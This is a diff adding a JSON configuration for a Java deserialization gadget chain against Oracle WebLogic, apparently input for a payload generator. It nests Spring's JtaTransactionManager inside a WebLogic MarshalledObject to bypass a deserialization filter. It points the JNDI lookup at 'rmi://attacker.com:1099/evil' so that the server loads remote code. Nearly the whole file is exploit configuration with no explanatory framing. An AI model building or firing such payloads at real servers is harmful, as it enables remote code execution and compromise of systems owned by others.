@@ -1,0 +1,25 @@
+{
+  "chain_type": "wrapper_chain",
+  "description": "WebLogic5+3: MarshalledObject wrapping JtaTransactionManager JNDI (filter bypass + JNDI)",
+  "root_class": "weblogic.corba.utils.MarshalledObject",
+  "root_trigger": "readResolve→new_OIS→readObject→JNDI.lookup",
+  "wrapper": {
+    "class": "weblogic.corba.utils.MarshalledObject",
+    "field_overrides": {
+      "objBytes": {"$inner_chain": true},
+      "hash": 42
+    }
+  },
+  "links": [
+    {
+      "class": "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager",
+      "role": "sink",
+      "field_overrides": {
+        "userTransactionName": "rmi://attacker.com:1099/evil",
+        "autodetectUserTransaction": false,
+        "autodetectTransactionManager": false
+      }
+    }
+  ],
+  "sink_method": "InitialContext.lookup"
+}
